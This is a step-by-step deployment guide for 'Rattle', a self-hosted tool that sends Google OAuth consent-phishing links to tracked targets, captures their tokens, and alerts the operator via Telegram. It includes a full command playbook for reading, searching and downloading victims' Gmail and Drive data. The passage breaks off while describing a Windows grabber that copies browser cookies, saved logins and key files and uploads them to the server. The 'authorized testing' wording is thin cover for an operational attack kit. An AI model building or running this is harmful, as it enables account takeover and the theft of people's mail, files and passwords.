# 🚀 RATTLE — Deployment Guide v6.1 (A to Z, baby steps, zero errors)

**Who this guide is for:** someone who has NEVER used a server, never typed a
Linux command, and never configured DNS before. If you can copy, paste, press
Enter, and read what the screen says back to you — you can deploy this.

**How to use this guide:**
- Do the steps **IN ORDER**. Never skip ahead.
- Every step ends with a **CHECK**. Do not move on until the check passes.
- Boxes like this one that start with `$` or are indented are commands you
  TYPE or PASTE. Everything else is explanation.
- When a command shows `<SOMETHING>` in angle brackets, replace it (including
  the brackets) with your own value.
- If a check fails, find your exact error in **Part C (Troubleshooting)**.

**Your values (used everywhere in this guide):**

| Thing | Value |
|---|---|
| Domain | officialmonsterz.store |
| VPS IP | 37.10.71.163 |
| VPS OS | Ubuntu 22.04 |
| Email | willsmith32702@gmail.com |
| Repo | https://github.com/officialmonsterz/rattle.git |

---

# 📚 WHAT YOU ARE BUILDING (plain English)

A website (running in Docker, secured with Nginx + SSL) that:

1. Creates Google OAuth consent links for authorized security testing
2. Gives each target a UNIQUE tracked link and counts their clicks
3. Captures the OAuth token when consent is approved + pings your phone via Telegram
4. Re-checks every captured token every 30 minutes (green badge = alive, red = dead)
5. Protects everything with a password, a 6-digit MFA code, and an audit log
6. **NEW (v6)** receives browser-data archives (`/api/grab/upload`) from the
   grabber client (`browser_grab.py`) run on Windows machines you own or are
   authorized to test — and lists/downloads them on a **Grabs** page

**Vocabulary (so nothing confuses you):**

| Word | What it means here |
|---|---|
| VPS | A computer you rent in the cloud, always on, that runs your website |
| DNS | The internet's phone book — it connects your domain name to your VPS IP |
| SSH | A way to control the VPS by typing commands from your own computer |
| Terminal / PowerShell | The black window where you type commands |
| Docker | A box that runs the app so it behaves the same on every server |
| Nginx | The doorman — receives visitors and sends them to the app |
| SSL / HTTPS | The padlock 🔒 — encrypts traffic to your site |
| Token | A digital key that lets the app read Gmail/Drive within consented scopes |

---

# STAGE 0 — THINGS YOU NEED (5 minutes, on your own computer)

Before touching anything, confirm you have all four:

- [ ] **Your VPS IP (`37.10.71.163`) and its root password** — from the company
      you rented the server from (check their email or dashboard)
- [ ] **Your Namecheap login** (you own officialmonsterz.store there)
- [ ] **A Gmail account you control** (`willsmith32702@gmail.com` is fine)
- [ ] **Telegram installed on your phone**

Nothing to install on your own computer yet. Everything happens in a browser
or in the SSH window.

**How to open a terminal on YOUR computer (needed many times later):**

- **Windows:** press the Windows key, type `powershell`, click **Windows PowerShell**
- **Mac:** press `Cmd + Space`, type `terminal`, press Enter
- **Linux:** open any terminal app

You'll know it worked when a window opens with a blinking cursor waiting for
you to type.

---

# PART A — FRESH SERVER BUILD

## A1 — DNS: POINT YOUR DOMAIN AT YOUR SERVER

**What this does:** DNS tells the whole internet "when someone types
officialmonsterz.store, send them to IP 37.10.71.163". We do this FIRST
because the SSL certificate authority (Let's Encrypt) refuses to issue your
padlock 🔒 until the domain really points at your server. DNS changes need
time to spread (usually 10–30 minutes).

### A1.1 — Log in to Namecheap
1. Open your browser → go to https://www.namecheap.com → log in.
2. On the LEFT menu, click **Domain List**.
3. Find `officialmonsterz.store` in the list → click **Manage** on its row.

### A1.2 — Create the A record (the main "send visitors here" record)
1. Click the **Advanced DNS** tab at the top.
2. Under **Host Records**, click **Add New Record**.
3. Fill in EXACTLY:
   - Type: `A Record`
   - Host: `@` (the @ symbol means "the domain itself, no www")
   - Value: `37.10.71.163`
   - TTL: `Automatic`
4. Click the green **Save All Changes** checkmark button.

### A1.3 — (Optional but recommended) add the www record
Click **Add New Record** again:
   - Type: `CNAME Record`
   - Host: `www`
   - Value: `officialmonsterz.store.` ← **yes, include the dot at the end**
   - TTL: `Automatic`
Save.

### A1.4 — DELETE any old IP records
Look at every record in the list. If ANY A record still points to your OLD
server IP (for example `25.87.33.222`), delete it (trash icon) or edit it to
`37.10.71.163`. Two A records with different IPs = visitors randomly get
sent to the wrong, dead server later. There should be exactly ONE A record
with Host `@` and Value `37.10.71.163`.

### A1.5 — CHECK that DNS works

Open a terminal on your OWN computer (Stage 0 showed how) and type:

    ping officialmonsterz.store

Press Enter. On Windows you can stop it with `Ctrl + C`.

**PASS — you should see:**

    PING officialmonsterz.store (37.10.71.163): 56 data bytes
    64 bytes from 37.10.71.163: ...

The important part is that the IP in brackets is **37.10.71.163**.

**FAIL:** any other IP → DNS hasn't spread yet. Wait 10–30 minutes and run the
ping again. You can do Stages A2–A3 while you wait (they don't need DNS) —
just do NOT run Stage A6 (the SSL script) until this check passes.

---

## A2 — PREPARE THE VPS (the rented server)

**What this does:** connect to the server, update it, add a firewall, and
install Docker. Each block below = copy, paste, press Enter, read the output.

### A2.1 — Connect to the server (SSH)

In the terminal ON YOUR COMPUTER, type:

    ssh root@37.10.71.163

Press Enter.

- If it asks `Are you sure you want to continue connecting? (yes/no)` →
  type `yes` and press Enter. (It only asks the first time ever.)
- It then asks for the password → type your root password and press Enter.
  **Typing is invisible** — no dots, no stars — that is normal. Just type
  it blind and press Enter.

**CHECK:** your prompt changes to something ending in `#`, like
`root@vps-ab12:~#`. That `#` means you are now INSIDE the server. Every
command from now on (until Part B) is typed in THIS window.

### A2.2 — Update the server

    apt update && apt upgrade -y

**What it does:** downloads the latest security fixes for Ubuntu.
**Takes:** 1–3 minutes. Yes to anything it asks (the `-y` already answers
yes for you).

**EXPECTED:** lots of scrolling text ending with lines like
`0 upgraded, 0 newly installed` or
`Setting up <package-name> ...` and **no red lines starting with `E:`**.

### A2.3 — Set the clock and install base tools

    timedatectl set-timezone UTC

    apt install -y curl git ufw fail2ban wget

**What each is:** `curl`/`wget` = download files; `git` = download your code;
`ufw` = the firewall; `fail2ban` = blocks bots that guess passwords.

**EXPECTED:** ends with `Setting up fail2ban ...` and no errors.

### A2.4 — Turn on the firewall (allow ONLY doors 22, 80, 443)

    ufw allow OpenSSH
    ufw allow 80/tcp
    ufw allow 443/tcp
    ufw --force enable
    ufw status

**What it means:** door 22 = your SSH, door 80 = plain web, door 443 =
secure web. Everything else gets blocked.

**EXPECTED:**

    Status: active

    To                         Action      From
    --                         ------      ----
    OpenSSH                    ALLOW       Anywhere
    80/tcp                     ALLOW       Anywhere
    443/tcp                    ALLOW       Anywhere

**CHECK:** says `active`, and **no port 8000 in the list**. Port 8000 is the
app's private door — only Nginx may talk to it, never the internet.

### A2.5 — Start fail2ban

    systemctl enable --now fail2ban
    systemctl is-active fail2ban

**EXPECTED:** the second command prints exactly: `active`

### A2.6 — Install Docker (the OFFICIAL way)

⚠️ **Never** run `apt install docker` — that installs an unrelated old Ubuntu
program. This exact mistake has bitten this project before. Only use:

    curl -fsSL https://get.docker.com | sh

**Takes:** 1–2 minutes. **What it does:** installs the real Docker engine
properly.

Then verify:

    docker --version
    docker compose version

**EXPECTED (your numbers may differ — that's fine):**

    Docker version 27.x.x, build abc1234
    Docker Compose version v2.x.x

**CHECK:** BOTH commands print a version. If the second fails, re-run the
`curl ... | sh` line and try again.

### A2.7 — DISCONNECT AND RECONNECT SAFELY (optional hygiene)

If at any point later your SSH window freezes or you close it, just repeat
A2.1 (`ssh root@37.10.71.163`). Nothing you installed is lost by
disconnecting.

---

## A3 — GET THE CODE AND CREATE YOUR SECRETS

### A3.1 — Download your code

    cd /root
    git clone https://github.com/officialmonsterz/rattle.git
    cd /root/rattle

**What it does:** downloads a copy of your GitHub repo into the folder
`/root/rattle`, then moves you inside it.

**EXPECTED:** `Cloning into 'rattle'...` ... `Receiving objects: 100% ...`

### A3.2 — PRE-FLIGHT FILE CHECK (mandatory — catches "missing file" crashes early)

Copy and paste this ENTIRE block as one single paste, then press Enter:

    for f in app.py models.py notifier.py liveness.py browser_grab.py \
             config.example.py requirements.txt Dockerfile docker-compose.yml \
             setup_nginx_ssl.sh .gitignore \
             templates/base.html templates/login.html templates/mfa_setup.html \
             templates/dashboard.html templates/campaigns.html \
             templates/campaign_create.html templates/campaign_detail.html \
             templates/tokens.html templates/victims.html templates/settings.html \
             templates/grabs.html templates/grab.html; do
      if [ -f "$f" ]; then echo "OK    $f"; else echo "MISSING  $f  <-- STOP"; fi
    done
    grep -q "Flask-Migrate" requirements.txt && echo "OK    Flask-Migrate" || echo "MISSING Flask-Migrate <-- STOP"
    bash -n setup_nginx_ssl.sh && echo "OK    nginx script" || echo "BROKEN nginx script"
    python3 -c "import ast; ast.parse(open('browser_grab.py').read()); print('OK    browser_grab.py syntax')"

**What it does:** checks every file the app needs exists on the server, that
requirements.txt contains Flask-Migrate (a missing one caused a real crash
before: `ModuleNotFoundError: No module named 'flask_migrate'`), that the
Nginx script has no typos, and that the grabber script is valid Python.

**EXPECTED:** every line starts with `OK`, like:

    OK    app.py
    OK    models.py
    ...
    OK    Flask-Migrate
    OK    nginx script
    OK    browser_grab.py syntax

**If ANY line says `MISSING <-- STOP`:** that file was never committed to
GitHub. Fix on github.com: open the repo → **Add file → Create new file** →
type the exact missing filename → paste the file's full contents → **Commit
changes**. Then on the VPS run:

    cd /root/rattle && git pull

...and re-run the A3.2 block. Do not continue with a MISSING file.

### A3.3 — Create config.py (typo-proof — the secret fills itself in)

**Why this method:** hand-typing config files is how people create broken
quotes and crashes. This method generates the random secret automatically and
writes the file for you. Paste ALL of this as one block:

    SECRET=$(python3 -c "import secrets; print(secrets.token_hex(32))")
    GRABKEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(24))")
    cat > config.py << EOF
    """
    Rattle configuration - NEVER commit this file to git.
    """

    class Config:
        RATTLE_SECRET_KEY = "$SECRET"
        DATABASE_URL = "sqlite:///rattle.db"
        RATTLE_INITIAL_PASSWORD = "RattleLab-2026-OfficialMonsterz"
        TELEGRAM_BOT_TOKEN = ""
        TELEGRAM_CHAT_ID = ""
        TOKEN_CHECK_INTERVAL_MINUTES = 30
        GRAB_UPLOAD_KEY = "$GRABKEY"
    EOF

**What each line means:**
- `SECRET` → a random 64-character key that keeps your login sessions alive
  across restarts (random logouts happen without it)
- `GRABKEY` → the password that browser-grab uploads must present (v6)
- `RATTLE_INITIAL_PASSWORD` → your FIRST admin password, fixed and known,
  so you can never get locked out of a fresh install
- `DATABASE_URL` → where data is stored (a simple file)
- The Telegram lines get filled in Step A4

**📝 WRITE DOWN TWO THINGS NOW (on real paper or a notes app):**
1. First admin password: `RattleLab-2026-OfficialMonsterz`
   (you will change it after first login)
2. Your grab-upload key — print it with:

       grep GRAB_UPLOAD_KEY config.py

   It prints something like:
   `        GRAB_UPLOAD_KEY = "kQ9x_3Lm-tPzR8vWqN1aBcYdEfGh"`
   Copy the part INSIDE the quotes (e.g. `kQ9x_3Lm-tPzR8vWqN1aBcYdEfGh`).
   You need it in Part B.

### A3.4 — CHECK the config file is correct

    grep -c "PASTE" config.py
    git check-ignore config.py && echo "PROTECTED - good"

**EXPECTED:**
- First command prints: `0`
- Second command prints: `PROTECTED - good`

**If the second prints nothing:** config.py isn't git-protected. Fix on
GitHub: open `.gitignore` in the repo → make sure it contains a line that
says `config.py` → Commit. Then on the VPS: `git pull` → re-check. (This
matters because config.py holds secrets and must never be published.)

---

## A4 — TELEGRAM ALERTS (so your phone pings on every capture)

**What this does:** creates a personal Telegram bot. On every captured token
(and every received grab), it messages you instantly.

### A4.1 — Create the bot
1. On your phone, open Telegram → tap the search 🔍 → type `BotFather`
   → open the one with the **blue verified check**.
2. Send it: `/newbot`
3. It asks for a name → send: `Rattle Alerts`
4. It asks for a username → send something unique like
   `officialmonsterz_rattle_bot` (add numbers if taken, e.g. `..._bot2`)
5. BotFather replies with a message containing a **token** like:

       7482910563:AAH8s2kXz9-qLw3nR5pQ7vT1mY6uB4cD2eF

   Copy that whole token. Treat it like a password.

### A4.2 — Activate the chat (REQUIRED — a bot can never message first)
1. In Telegram search, find YOUR new bot by its username → open its chat →
   send it: `hello` (anything works; it just needs one message from you).
2. On your computer, open a browser and paste this (replace `<TOKEN>` with
   your real token):

       https://api.telegram.org/bot<TOKEN>/getUpdates

3. In the wall of text that appears, find:  `"chat":{"id": 123456789,`
   → copy that number. That's your chat ID. (A negative number is fine too.)

### A4.3 — Put both values into config.py
Back in the SSH window:

    nano config.py

Nano is a simple text editor. Use the arrow keys to move. Find:

    TELEGRAM_BOT_TOKEN = ""
    TELEGRAM_CHAT_ID = ""

Put your token and chat id INSIDE the quotes (replace `<TOKEN>` / `<ID>`):

    TELEGRAM_BOT_TOKEN = "7482910563:AAH8s2kXz9-qLw3nR5pQ7vT1mY6uB4cD2eF"
    TELEGRAM_CHAT_ID = "123456789"

Save and exit: press `Ctrl + O`, then `Enter` (saves), then `Ctrl + X` (exits).

### A4.4 — CHECK the bot works (before Docker even runs)

On the VPS, paste this with YOUR values substituted:

    curl -s "https://api.telegram.org/bot<TOKEN>/sendMessage" -d chat_id=<ID> -d text="Rattle test"

**PASS:** your phone gets the message "Rattle test" AND the terminal prints
text containing `"ok":true`.

**FAIL `Unauthorized`:** token typed wrong. **FAIL `chat not found`:** you
never sent `hello` to the bot (A4.2 step 1), or chat id is wrong.

---

## A5 — BUILD AND START THE APP

### A5.1 — Build and start

    cd /root/rattle
    docker compose up -d --build

**What it does:** builds the app box (first time: 2–5 minutes) and starts it
in the background.

**EXPECTED end:**

    ✔ Image rattle-rattle       Built
    ✔ Container rattle-rattle-1 Started

**CHECK:** while it builds, find the `[4/6] RUN pip install` step in the
scrolling output — it must actually RUN. If it says `CACHED` and the app
later crashes on a missing module, force a clean rebuild once:

    docker compose build --no-cache && docker compose up -d

### A5.2 — CHECK the container is really running

A container that says "Started" can still die one second later. Verify:

    sleep 5
    docker compose ps

**PASS:**

    NAME              STATUS
    rattle-rattle-1   Up 5 seconds

**FAIL (`Exited` or `Restarting (3)`):** get the reason:

    docker compose logs rattle --tail 50

read the LAST red traceback, match it in **Part C**, fix, then repeat A5.1.

### A5.3 — CHECK the health endpoint

    curl -s http://127.0.0.1:8000/health

**PASS:** `{"database":true,"status":"ok"}`
(If it fails while the container is Up: wait 10 seconds and retry — first
boot creates the database.)

### A5.4 — CHECK the admin account was created

    docker compose logs rattle | grep -E "FIRST RUN|Initial"

**PASS (you set a fixed password in A3.3):** a line like
`First-run admin created using RATTLE_INITIAL_PASSWORD from config` →
you already know the password; nothing to copy.

---

## A6 — NGINX + HTTPS (THE PADLOCK 🔒)

### A6.1 — CHECK DNS one more time (SSL refuses without it)

    dig +short officialmonsterz.store

**CHECK:** must print exactly `37.10.71.163`. If not → back to A1, wait for
DNS, then return.

### A6.2 — Run the installer

    cd /root/rattle
    chmod +x setup_nginx_ssl.sh
    ./setup_nginx_ssl.sh

("chmod +x" = mark the file as runnable, once.) It asks four questions —
answer EXACTLY:

| Prompt | Type |
|---|---|
| Enter your domain | officialmonsterz.store |
| Enter your email for Let's Encrypt | willsmith32702@gmail.com |
| Enter project path | /root/rattle |
| Enter backend port | press Enter (accepts 8000) |

**What it does:** installs the doorman (Nginx) + the certificate robot
(Certbot), gets you a free SSL certificate, and turns on auto-renewal.

**EXPECTED output ends with:**

    [+] Nginx and Certbot installed
    [*] Configuring Nginx (HTTP stage)...
    nginx: configuration file /etc/nginx/nginx.conf test is successful
    [+] Nginx running (HTTP stage)
    [*] Obtaining SSL certificate...
    Successfully received certificate.
    [+] SSL certificate obtained
    [*] Upgrading Nginx to HTTPS...
    [+] Nginx serving HTTPS
    [+] Auto-renewal enabled

⚠️ If you see `nginx: [emerg] unknown directive "http2"` → see Part C, T12.

### A6.3 — Fix static-file permissions (30 seconds, prevents plain-looking pages)

The doorman runs as a low-privilege user and your code sits in `/root`, which
only root can enter. Open the door:

    chmod 755 /root
    chmod -R 755 /root/rattle/static

### A6.4 — CHECK HTTPS from anywhere

On YOUR computer's browser, open:

    https://officialmonsterz.store/health

**PASS:** `{"database":true,"status":"ok"}` plus a padlock 🔒 in the address
bar. (Fresh certificates can confuse a browser for ~5 minutes — wait and
reload if so.)

---

## A7 — FIRST LOGIN, PASSWORD CHANGE, MFA

### A7.1 — Log in
1. Visit `https://officialmonsterz.store`
2. Username: `rattle`
3. Password: `RattleLab-2026-OfficialMonsterz` (from A3.3 — unless already
   changed in an earlier install)

**CHECK:** the Dashboard loads with counters at 0 (or your previous data).

### A7.2 — Change the password
1. Top nav → **Settings**
2. Current password → the one you just used
3. New password → minimum 12 characters (a 4-word passphrase is best, e.g.
   `blue-tiger-clouds-marble`)
4. Confirm it → **Update Password**

**CHECK:** green banner `Password updated successfully!`

### A7.3 — Enable MFA (the thing that actually stops attackers)
1. Top nav → **MFA**
2. On your phone install **Google Authenticator** (or Aegis / 1Password)
3. In the app: tap **+** → **Scan a QR code** → scan the QR shown on the page
4. The app now shows a 6-digit code that changes every 30 seconds
5. Type the CURRENT code into Rattle → **Enable MFA**

**CHECK:** green banner. Then PROVE it: **Logout** → log in with username +
new password → it must ask for the 6-digit code → enter it → you get in.

### A7.4 — CHECK the audit log
Dashboard → scroll to **Audit Log**. Expected rows: `login_success`,
`mfa_enabled`, `password_changed` — each with your IP and timestamp.

---

## A8 — GOOGLE CLOUD OAUTH APP (A to Z)

Google occasionally redesigns this console; wherever the wording differs,
both paths are given — follow the one you see.

### A8.1 — Create the project
1. Browser → https://console.cloud.google.com → sign in with
   willsmith32702@gmail.com (or any Google account you control)
2. First visit may show a "Welcome" popup and ask to accept Terms of Service
   and pick a country → accept/continue
3. At the TOP of the page find the project dropdown (says
   **"Select a project"** or shows a project name) → click it → **NEW PROJECT**
   (top-right of the popup)
4. Project name: `rattle-lab` — Location: leave "No organization" → **CREATE**
   → wait ~30 seconds for the notification

### A8.2 — Make sure you are INSIDE rattle-lab (critical)
Click the project dropdown again → click `rattle-lab` in the list.
**CHECK:** the top of the console now shows `rattle-lab`. Anything you
configure in the wrong project silently won't work later.

### A8.3 — Enable the two APIs
1. Left hamburger menu (☰) → **APIs & Services** → **Library**
2. Search `Gmail API` → open it → **ENABLE**
3. Back to Library → search `Google Drive API` → open it → **ENABLE**

**CHECK:** searching "Gmail API" again shows an Enabled/Manage state, not a
big ENABLE button.

### A8.4 — Configure the app's identity (the consent screen)

**PATH A — you see "Google Auth Platform" in the left menu (newer console):**
1. Left menu → **Google Auth Platform**
2. **Branding** tab: App name `Rattle Lab`, user support email
   `willsmith32702@gmail.com` → **SAVE**
   (use your own honest app identity — never pretend to be another company)
3. **Audience** tab: publishing status must read **Testing** → under
   **Test users** → **+ ADD USERS** → enter `willsmith32702@gmail.com`
   (and any other Gmail you control) → **Save**

**PATH B — you see "OAuth consent screen" (older console):**
1. **APIs & Services** → **OAuth consent screen** → User Type **External** →
   **CREATE**
2. App name `Rattle Lab`; user support email + developer email
   `willsmith32702@gmail.com`
3. **SAVE AND CONTINUE** through Scopes (add nothing manually) and Test users
   (add `willsmith32702@gmail.com`), then **BACK TO DASHBOARD**

*(If you ever hit a HARD block during consent with no "Advanced" option — see
Part C, T9 / T9b for the test-user fix.)*

### A8.5 — Create the OAuth Client (the actual credentials)
1. **APIs & Services** → **Credentials** (new console: Google Auth Platform →
   **Clients**) → **+ CREATE CREDENTIALS** (or **CREATE CLIENT**) →
   **OAuth client ID** → Application type: **Web application**
2. Name: `rattle-lab-web`
3. **Authorized JavaScript origins** → ADD URI → type exactly:

       https://officialmonsterz.store

   (no slash at the end)
4. **Authorized redirect URIs** → ADD URI → type exactly:

       https://officialmonsterz.store/callback

   These four are all DIFFERENT — only the first is right for us:
   - ✅ `https://officialmonsterz.store`
   - ❌ `https://officialmonsterz.store/` (trailing slash)
   - ❌ `http://...` (must be https)
   - ❌ `https://www.officialmonsterz.store` (no www)
5. Click **CREATE**

### A8.6 — Copy your two secrets
A popup shows:

    Client ID:      123456789012-xxxxxxxxxxxx.apps.googleusercontent.com
    Client secret:  GOCSPX-xxxxxxxxxxxxxxxxxxxx

Copy BOTH (there are little copy icons). Keep the secret like a password —
never in screenshots, chats, or GitHub.

**CHECK:** Client ID ends in `.apps.googleusercontent.com`; secret starts
with `GOCSPX-`.

### A8.7 — Keep the app in Testing + test users (lab mode — expected, not errors)
- Only test users can complete consent — exactly what you want
- During consent Google may warn **"unverified app"** → click **Advanced** →
  **Go to Rattle Lab (unsafe)** — it's your own lab app, the warning is normal
- Restricted-scope consents (Gmail/Drive) expire after 7 days in Testing
  mode → when a token flips "dead", just generate a fresh link and re-consent

---

## A9 — CREATE THE CAMPAIGN + END-TO-END TEST

Test everything on yourself, in your own lab, once:

1. Log into `https://officialmonsterz.store`
2. Nav → **Campaigns** → **New Campaign** → fill:
   - Campaign Name: `lab-test-1`
   - Google Client ID: (paste from A8.6)
   - Google Client Secret: (paste from A8.6)
   - Redirect URI: `https://officialmonsterz.store/callback` — EXACTLY this
   - Scopes: leave the default
   → **Create Campaign**
3. CHECK: campaign page shows a "Generic Phishing Link" starting
   `https://accounts.google.com/o/oauth2/v2/auth?client_id=...` containing
   `redirect_uri` = `https%3A%2F%2Fofficialmonsterz.store%2Fcallback`
   (that's your callback in URL-encoded form — correct).
4. Campaign page → **Per-Target Tracked Links** → label `self-test` →
   **Generate** → copy the green-banner link
   (`https://officialmonsterz.store/link/Ab3xY9...`)
5. Open that link in a browser → you land on Google's real sign-in page →
   check the target row in Rattle shows **Clicks: 1**
6. Sign in as `willsmith32702@gmail.com` → consent screen → if "unverified
   app" → **Advanced** → **Go to Rattle Lab (unsafe)** → **Allow**
7. You see "Verification Successful", then redirect to Google.

**CHECK — all four systems fired:**
- 📱 Telegram within seconds:

      🎯 Rattle capture
      Campaign: lab-test-1
      Target: self-test
      Scopes: openid profile email https://www.googleapis.com/auth/gmail.readonly ...

- 🔑 Tokens page: row with green `valid` badge + "Last Checked" timestamp
- 📊 Dashboard: Tokens Captured +1; audit log shows `token_captured`
- 🎯 Campaign detail: victim `self-test` shows status **Authorized**

---

## A9b — TOKEN LIVENESS (background checker, automatic)

Every 30 minutes the app re-checks each refresh token: still refreshable →
stays `valid` (green, access token refreshed); revoked → flips `dead` (red).

1. Confirm the worker started:

       docker compose logs rattle | grep "liveness worker started"

   **CHECK:** `token liveness worker started (every 30 minutes)`
2. Manual test (no waiting): Tokens page → **Run liveness check now** →
   green banner + every row gets a fresh "Last Checked" time.
3. Per-token: press the ↻ (sync) icon → toast "Token refreshed
   successfully!" → page reloads, status `valid`.
4. Honest "dead" test: visit https://myaccount.google.com/permissions →
   remove access for `rattle-lab` → in Rattle press ↻ on that token →
   badge flips to `dead`. That is revocation detection working.

---

## A10 — THE COMPLETE TOKEN PLAYBOOK (every command, A to Z)

A captured token is your key to the Gmail/Drive API. This is your full
command library: how to store it, refresh it, read mail, search mail,
attachments, Drive files, and decode message bodies. All commands are run on
the VPS (the SSH window) unless stated.

**THE ONE RULE THAT CAUSES 90% OF FAILURES:** access tokens live ~1 hour;
refresh tokens live months. Any `401 Login Required` after that just means
"mint a fresh access token first" (Step A10B). Also: `$AT` is a shell
variable — if you never SET it, curl literally sends the text "$AT" and
Google says 401. Setting it is ONE line.

### A10A — Store the access token the right way

**A10A1 — Get it:** Rattle → Tokens page → 👁 eye icon → copy the
**Access Token**.

**A10A2 — Put it into a variable** — ONE single line, no breaks, one paste:

    AT="ya29.PASTE-YOUR-FULL-TOKEN-HERE"

Press Enter. **The screen shows nothing — that is correct** (variables are
silent). Verify:

    echo $AT

**EXPECTED:** your token prints back. Empty → the line broke when pasting;
paste again as ONE line.

**A10A3 — Sanity test:**

    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/profile"

**EXPECTED:**

    {"messagesTotal":201,"threadsTotal":158,"historyId":"...","emailAddress":"willsmith32702@gmail.com"}

(Your numbers will differ.) 401 → token older than 1 hour → do A10B now.

### A10B — Refresh the access token (the command you'll use most)

1. Tokens → 👁 → copy the **Refresh Token**
2. Campaigns → your campaign → copy **Client ID** and **Client Secret**
3. One paste (three lines):

    curl -s https://oauth2.googleapis.com/token \
      -d client_id="PASTE_CLIENT_ID" \
      -d client_secret="PASTE_CLIENT_SECRET" \
      -d refresh_token="PASTE_REFRESH_TOKEN" \
      -d grant_type=refresh_token

**EXPECTED:**

    {
      "access_token": "ya29.a0AXe...NEW-TOKEN...",
      "expires_in": 3599,
      "scope": "https://www.googleapis.com/auth/gmail.readonly ...",
      "token_type": "Bearer"
    }

Copy the new `access_token` → redo A10A2 with it.

**EXPECTED ERRORS (not bugs):**
- `"invalid_grant"` → consent revoked or 7-day Testing expiry → fresh tracked
  link, re-consent
- `"invalid_client"` → client_id/secret typo
- 400 about redirect_uri → you added `redirect_uri`; the refresh grant never
  needs it — remove that line

### A10C — Read mail (in order of usefulness)

**C1 — List newest messages (IDs only):**

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=5"

**EXPECTED:** `{"messages":[{"id":"1a0d68aa5df7ba9f","threadId":"..."},...],"resultSizeEstimate":201}`

⚠️ Do NOT glue a message ID onto this URL — that causes
`400 Invalid value at 'max_results' (TYPE_UINT32)`. One message = different
URL (C3).

**C2 — Newest 15 with sender + subject (the money command):**

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=15&format=metadata&metadataHeaders=From&metadataHeaders=Subject&metadataHeaders=Date"

Cleaner senders+subjects only:

    ... | grep -o '"value": "[^"]*"' | sed 's/"value": //' | tr -d '"' | sort -u

**C3 — Read ONE message** (the CORRECT URL form — ID after `messages/`,
never after `?`):

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages/1a0d68aa5df7ba9f?format=full"

**C4 — Decode the body:** from C3's output find `payload` → `parts` →
`body.data` (a long base64-ish string). Copy it and decode:

    echo "PASTE_DATA_STRING_HERE" | tr '_-' '/+' | base64 --decode

The `tr '_-' '/+'` step is MANDATORY (Gmail uses URL-safe base64). Skipping
it = garbage or `base64: invalid input`.

**C5 — Search the mailbox (like the Gmail search box)** — put your query in
`q=`, using `+` between words:

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=PASSWORD+RESET&maxResults=5"

Handy queries: `q=from:paypal` · `q=newer_than:1d` · `q=is:unread` ·
`q=invoice` · `q=has:attachment`

**C6 — List labels (folders):**

    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/labels"

**C7 — Mailbox stats:**

    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/profile"

**C8 — Download an attachment:**
1. In C3 output, find the part with `"filename": "report.pdf"` → copy its
   `body.attachmentId`
2.

       curl -s -H "Authorization: Bearer $AT" \
         "https://gmail.googleapis.com/gmail/v1/users/me/messages/MESSAGE_ID/attachments/ATTACHMENT_ID"

3. The `data` field is base64url — save + decode:

       echo "PASTE_DATA" | tr '_-' '/+' | base64 --decode > file.pdf

### A10D — Drive commands (same token works)

**D1 — List recent files:**

    curl -s -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files?pageSize=20&fields=files(name,mimeType,modifiedTime,size)"

**EXPECTED:** `{"files":[{"name":"Project Brief.docx",...},...]}`

**D2 — Search files by name:**

    curl -s -G -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files" \
      --data-urlencode "q=name contains 'invoice'" \
      --data-urlencode "fields=files(name,mimeType,size)"

**D3 — Download a Drive file:**

    curl -sL -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files/FILE_ID?alt=media" -o file.bin

### A10E — Identity / account info

    curl -s -H "Authorization: Bearer $AT" "https://www.googleapis.com/oauth2/v2/userinfo"

**EXPECTED:** `{"id":"...","email":"willsmith32702@gmail.com","verified_email":true,"name":"Will Smith",...}`

### A10F — One-shot summary script (create once, use forever)

    cat > /root/quickmail.sh << 'EOF'
    #!/bin/bash
    AT="$1"
    if [ -z "$AT" ]; then echo "Usage: ./quickmail.sh ACCESS_TOKEN"; exit 1; fi
    echo "== MAILBOX STATS =="
    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/profile"
    echo; echo "== RECENT SENDERS / SUBJECTS =="
    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=15&format=metadata&metadataHeaders=From&metadataHeaders=Subject" \
      | grep -o '"value": "[^"]*"' | sed 's/"value": //' | tr -d '"' | sort -u
    echo; echo "== DRIVE RECENT FILES =="
    curl -s -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(name,mimeType,modifiedTime)"
    echo
    EOF
    chmod +x /root/quickmail.sh

Use (paste the token directly, never "Bearer $AT" inside the arg):

    /root/quickmail.sh "ya29.a0AXe...PASTE-TOKEN"

**EXPECTED:** three sections print with real numbers and names.

### A10G — WHAT THE TOKEN CAN AND CANNOT DO (know your limits)

| CAN DO ✅ | CANNOT DO ❌ |
|---|---|
| Read emails via API | Browser login to gmail.com |
| Read Drive files | Send / delete / modify anything |
| See name + email | Change password or 2FA settings |
| Search mail, list folders | Capture cookies or browser sessions |
| Download attachments | Access scopes never consented to |

An OAuth token is API access WITHIN THE CONSENTED SCOPES — never a browser
session, never a password. (Collecting browser data is the Grabber's job —
Part B.) Token hygiene: access token = throwaway (1 hour). Refresh token =
the real asset (watch its liveness badge). Old test tokens → revoke at
https://myaccount.google.com/permissions.

---

# PART B — THE BROWSER GRABBER (new in v6)

## B0 — What it is, in one paragraph
`browser_grab.py` is a small Python script you run on a **Windows machine you
own or are authorized to test**. It finds every Chrome/Edge/Brave profile and
copies `Local State`, the `Cookies` database and `Login Data`; it finds every
Firefox profile and copies `cookies.sqlite`, `logins.json`, `key4.db`; it
counts the cookies, zips everything with a `manifest.json`, and (optionally)
uploads the zip to your server. It needs ONLY Python 3 on that machine — no
